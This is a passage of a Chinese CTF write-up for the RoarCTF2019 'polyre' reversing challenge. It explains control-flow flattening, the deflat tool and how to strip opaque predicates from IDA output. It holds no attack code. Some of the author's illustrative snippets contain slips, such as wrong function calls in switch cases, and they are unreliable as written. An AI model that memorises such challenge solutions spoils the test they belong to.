      <url>/2021/12/15/%5BRoarCTF2019%5Dpolyre%20writeup/</url>
      
        <content type="html"><![CDATA[<p>buu刷题记录-<a href="https://buuoj.cn/challenges#[RoarCTF2019]polyre">RoarCTF2019 polyre</a></p><span id="more"></span><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>拿到文件ida打开，发现是很绝望的究极无敌的代码混淆——控制流平坦化。</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/1.png" alt="1"></p><h3 id="控制流平坦化介绍"><a href="#控制流平坦化介绍" class="headerlink" title="控制流平坦化介绍"></a>控制流平坦化介绍</h3><p>控制流平坦化(control flow flattening)的基本思想主要是通过一个主分发器来控制程序基本块的执行流程，例如下图是正常的执行流程 </p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/2.png" alt="2"></p><p>在经过控制流平台化的混淆之后，会变成如下的结构</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/3.png" alt="3"></p><p>流程图看起来就像是同一级的关系，块之间失去了层次分明，逻辑可读性变得更差。</p><p>就好比我们平时做的堆菜单题，选择菜单的时候，逻辑基本就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">int</span> num=getnum();</span><br><span class="line">    <span class="keyword">switch</span>(num)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            add();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            edit();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">delete</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            error_choice();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是有时候经过ida反编译并不是那么清晰的，我也不知道它是不是特意加了混淆还是ida本身的问题，反编译代码变成了下面的情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                    menu();</span><br><span class="line">                    <span class="keyword">int</span> num=getnum();</span><br><span class="line">                    <span class="keyword">if</span>(num!=<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    add();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(num&gt;<span class="number">2</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                edit();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num!=<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num!=<span class="number">4</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        edit();</span><br><span class="line">    &#125;</span><br><span class="line">    error_choice;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这么说吧，两个代码实现的功能是一样的，但是明显下面的可读性就变差了很多。我也不知道是不是这个在作妖，就是觉得很像，提出来讲一讲hhh。</p><p>但是好像又没有关系，因为它们块之间的关系本来就是平坦的，后面只是用while替代switch进行进一步混淆，但是其实有menu函数一看便知，所以它在这里加这样的逻辑混淆的确是无用功。</p><p>那么我猜控制流平坦化的流程就是：</p><p>①将所有块平坦化</p><p>②用switch分发</p><p>③把switch转成如上的那种while循环包起来的代码。</p><p>至于平坦化了之后如何实现前后的逻辑的关系呢？其实很简单，比如下面这个逻辑</p><p>假如明天下雨，那么我带伞，然后出门，否则我带上我的自行车，然后出门，写成伪代码是下面的逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (rain)&#123;</span><br><span class="line">    get_umb();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    get_bike();</span><br><span class="line">&#125;</span><br><span class="line">go_out();</span><br></pre></td></tr></table></figure><p>代码这么写起来看起来逻辑还是十分清晰的，那么如果加控制流平坦化混淆它会变成什么样呢？这里很明显出现三个语句块，如果rain条件成立，那么get_umb()，否则get_bike()，最后一定会执行go_out()。那么get_umb和get_bike就是一个二选一的关系，这俩块跟go_out又是先后的关系，这是我们一眼可以看出来的逻辑。</p><p>控制流平坦化第一步就是拆掉他们这样的逻辑关系，甭管有多少块，全部用while(1)+switch去控制，如下代码所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    ch=rain;</span><br><span class="line">    <span class="keyword">switch</span>(ch)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>：</span><br><span class="line">            get_bike();</span><br><span class="line">            ch=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            get_umb();</span><br><span class="line">            ch=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            get_bike();</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现平坦化了之后略微有一点点不可读，但是还能接受，但是它往往不会让你看的那么容易，因为它ch不可能就1，2，3，4这么给你弄好了，我再进一步加混淆。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    ch=(rain*<span class="number">2</span>+<span class="number">9876</span>)*<span class="number">9</span>+<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">switch</span>(ch)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">88984</span>：</span><br><span class="line">            get_bike();</span><br><span class="line">            ch=ch*<span class="number">9</span>+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">89002</span>:</span><br><span class="line">            get_umb();</span><br><span class="line">            ch=(ch<span class="number">-18</span>)*<span class="number">9</span>+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">800857</span>:</span><br><span class="line">            get_bike();</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果块再多，运算再复杂，你可能都不能一眼看出来下不下雨和带不带伞是一个什么联系了。</p><p>然后switch再同如上的menu这样变换一下逻辑，就更难读了，也就是我们题目中看到的这个样子，可以发现，它平坦的块已经是特别密集了，疯狂while(1)然后中间条件判断去break。</p><p>以上分析均为自己个人理解，并使用自己最朴素的语言讲述出来的。</p><h3 id="抵抗控制流平坦化"><a href="#抵抗控制流平坦化" class="headerlink" title="抵抗控制流平坦化"></a>抵抗控制流平坦化</h3><p>既然有人研究出了这样的代码混淆，自然也有人研究出了对应的解法，这里放项目地址<a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a></p><p>该项目以angr作为依赖，在个人使用的时候我把它源码download下来还需要把它flat_control_flow目录下的deflat.py移动到上一层目录才能正常使用，使用方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$python(3) deflat.py -f [file_name] --addr [function_addr]</span><br></pre></td></tr></table></figure><p>这里function_addr即为添加了此混淆的函数地址。放着跑个几分钟，就能跑出来一个控制流比较清晰的elf文件了。</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/4.png" alt="4"></p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>我们用ida反编译能得到以下代码</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">48</span>]; <span class="comment">// [rsp+1F0h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">60</span>]; <span class="comment">// [rsp+220h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">bool</span> v13; <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">bool</span> v19; <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">  <span class="keyword">char</span> *v20; <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">bool</span> v22; <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">bool</span> v24; <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v31; <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">bool</span> v34; <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(s1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  v11 = s;</span><br><span class="line">  <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &lt; <span class="number">10</span> || ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_43:</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v12 = v6;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    v13 = v12 &lt; <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = s[v6];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v15 = v14;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">if</span> ( v15 == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = &amp;s[v6];</span><br><span class="line">      *v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = v6 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v6 = v17;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v18 = i;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v19 = v18 &lt; <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v20 = s;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    v4 = *(_QWORD *)&amp;v20[<span class="number">8</span> * i];</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = v7;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v22 = v21 &lt; <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v23 = v4;</span><br><span class="line">      v24 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v27 = v4;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          v28 = <span class="number">2</span> * v27;</span><br><span class="line">        <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">        v4 = v28;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v25 = <span class="number">2</span> * v4;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          v26 = v25;</span><br><span class="line">        <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">        v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      v29 = v7;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v7 = v29 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = <span class="number">8</span> * i;</span><br><span class="line">    v31 = &amp;s1[<span class="number">8</span> * i];</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">LABEL_55:</span><br><span class="line">      *(_QWORD *)v31 = v4;</span><br><span class="line">    *(_QWORD *)v31 = v4;</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">    v32 = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">  v34 = v33 != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v34 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自习一看其实就发现其实它还是加了一些混淆，比如里面重复的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br></pre></td></tr></table></figure><p>这个表达式实际上是永远为假的，它因为dword_603058这个全局变量是在bss段上的，bss段上为未初始化的全局变量，所以它就是0。而且查一下它的交叉引用表也会发现与它相关的指令都是作为源操作数而非目的操作数，而且也没有取它地址做某些操作，在此基础之上我们基本可以认为它就是不变的。</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/5.png" alt="5"></p><p>所以这去了混淆之后还有一百多行的代码其实是他自己手动疯狂加的混淆。所以这里直接把所有的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">do</span></span></span><br><span class="line"><span class="function">    xxx</span></span><br><span class="line"><span class="function"><span class="title">while</span> <span class="params">( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span></span></span><br></pre></td></tr></table></figure><p>全部替换成xxx就好了，因为它只执行一次就退出了。</p><p>此外还有一些永为1的表达式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dword_603058 &lt; <span class="number">10</span> || ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这种情况下我我们直接把while循环去了，然后把这个语句之后在while循环语句内的所有语句都删了。</p><p>然后得到了以下的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 